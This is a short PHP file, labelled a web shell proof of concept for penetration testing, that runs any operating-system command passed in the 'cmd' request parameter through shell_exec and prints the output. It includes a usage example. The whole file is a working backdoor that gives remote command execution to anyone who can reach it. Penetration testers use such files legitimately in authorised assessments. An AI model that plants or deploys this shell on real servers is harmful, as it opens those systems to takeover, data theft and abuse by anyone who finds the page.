<?php
// Minimal PHP Web Shell — VAPT PoC
// Usage: cmd.php?cmd=id
if(isset($_REQUEST['cmd'])){
    echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>';
}
?>
